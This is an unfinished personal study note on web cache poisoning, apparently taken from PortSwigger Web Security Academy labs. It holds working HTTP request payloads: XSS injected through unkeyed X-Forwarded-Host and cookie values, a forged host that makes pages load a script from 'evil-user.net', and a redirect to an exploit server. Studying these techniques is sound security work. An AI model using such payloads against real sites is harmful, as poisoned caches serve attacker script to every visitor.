[[cache poisoning]]
## [[XSS]]
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public 
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

`X-Forwarded-Host` header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. It's also often unkeyed.
#### Poison example:
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

## Unsafe handling of resource imports
```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

## Cookie-handling vulnerabilities
Cookies are not included in the cache key.
Example:
```HTTP
GET / HTTP/2
Host: 0a3a00d8046d91ef80cce42100ef002e.web-security-academy.net
Cookie: fehost=prod-cache-01"}%3balert(1)//; session=QfTJLIM9bSLO6dLu6DjpBGIpdEaMRwEA
```

## Multiple headers
Example:
```http
GET /resources/js/tracking.js HTTP/2
Host: 0aa100d70367a08c80fb535000060064.web-security-academy.net
X-Forwarded-Host: exploit-0a05009b0370a021800b52c9014200a4.exploit-server.net
X-Forwarded-Scheme: http
```
If scheme is http, then redirect to `scheme://host`

## Exploiting responses that expose too much information
### Cache-control directives
Example of cache age disclosure:
```http
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```
### Vary header
`Vary` header specifies a list of additional headers that are part of the cache key.

#to-be-continued 
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flawsПр